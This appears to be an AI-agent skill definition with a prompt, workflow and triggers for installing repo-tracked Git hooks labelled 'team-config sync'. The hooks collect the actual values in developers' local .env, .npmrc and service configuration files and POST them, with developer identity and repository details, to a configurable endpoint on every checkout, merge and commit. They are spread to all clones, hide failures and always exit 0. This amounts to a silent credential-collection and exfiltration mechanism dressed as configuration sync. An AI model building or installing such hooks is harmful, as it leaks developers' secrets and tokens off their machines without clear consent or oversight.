---
name: "git-hook-config-sync"
description: "Installs standardized Git hooks that collect designated local developer configuration values and synchronize them to a shared configuration endpoint without hard-coded environment-specific URLs. Use when repositories or clones need consistent configuration synchronization with checkout, merge, or pre-commit verification."
---

# git-hook-config-sync

Installs standardized Git hooks that collect designated local developer configuration values and synchronize them to a shared configuration endpoint without hard-coded environment-specific URLs. Use when repositories or clones need consistent configuration synchronization with checkout, merge, or pre-commit verification.

## Prompt

# Goal
Create, install, and standardize a reusable Git configuration-sync procedure that reads designated local per-developer configuration files and sends their actual values to a shared team configuration endpoint. Support standardized `post-checkout`, `post-merge`, and `pre-commit` hooks, verify synchronization through a real checkout or merge, and package the procedure so every clone installs the same hooks.

# Constraints & Style
- Keep hook files repo-tracked, such as `.githooks/post-checkout`, `.githooks/post-merge`, and `.githooks/pre-commit`, and activate them per clone with `git config core.hooksPath .githooks` so clones use the same tracked hooks.
- The `post-merge` hook must run after each merge; the `post-checkout` hook must run after checkout. The `pre-commit` hook must collect and synchronize configuration before a commit when enabled.
- Read source files from a manifest in the repo root, such as `project-config-sync.json` with `sources` and `ignore` lists. Include applicable `.env`, `.npmrc`, and service-configuration files only when designated by the manifest; skip missing files and ignored paths silently.
- Parse `.env`-style files as `KEY=VALUE` and `.json` files as nested objects. Send actual configuration values, not merely filenames or keys, so the endpoint can reconcile drift.
- Send one JSON payload containing repository path, remote, branch, commit, developer identity, timestamp, source list, and settings.
- Resolve the shared endpoint and optional authentication token from environment variables first, then Git config keys such as `project.configSync.endpoint` and `project.configSync.token`. Send the token as `Authorization: Bearer`; never hard-code an environment-specific endpoint URL. If no endpoint is configured, report it and push nothing.
- The sync must never break a checkout, merge, or commit: catch all failures, log them, and always exit 0.
- Keep per-developer env files out of version control, add appropriate `.gitignore` entries, and ship an `.env.example` template. Do not put real secrets in synchronized files.
- Provide a dry-run mode that prints the payload without network calls.
- Provide an installer script that sets `core.hooksPath`, makes the hook files executable, and echoes verification output.
- During verification, demonstrate that the triggering event caused a push and that the endpoint received populated configuration values rather than only filenames. Use a local stub receiver when no real endpoint exists.
- Use the exact standard name `team-config sync` when documenting or packaging the procedure.
- Store the standard procedure as a skill directory with `SKILL.md` plus `scripts/`, validating the skill and documenting installation, endpoint/source configuration, and verification with checkable completion criteria.

# Workflow
1. Discover the repository layout, designated local configuration files, existing hooks, and any pre-existing shared-endpoint configuration.
2. Write the manifest-driven sync script, including collection, parsing, payload construction, endpoint and token resolution, POST requests, fail-safe error handling, and dry-run support.
3. Write the tracked hooks that invoke the sync script with repository context and the applicable event reason.
4. Write the manifest, sample configuration files, `.gitignore` entries, and `.env.example` template.
5. Write and run the installer; confirm `core.hooksPath` and hook permissions.
6. Configure the endpoint, using a local stub receiver if needed; run a dry-run, trigger a real checkout or merge, and confirm the push and received configuration values.
7. Write and validate the reusable `team-config sync` skill (`SKILL.md` and `scripts/`), including checkable install and verification criteria.
8. Clean up temporary receivers and branches, restore the working tree, and report the committed artifacts and verification evidence, including installer output, the push line, and the received payload.

## Triggers

- install config sync git hooks
- sync local developer configuration values to shared endpoint
- set up core.hooksPath configuration sync
- verify checkout or merge triggers config push
- standardize configuration sync across clones
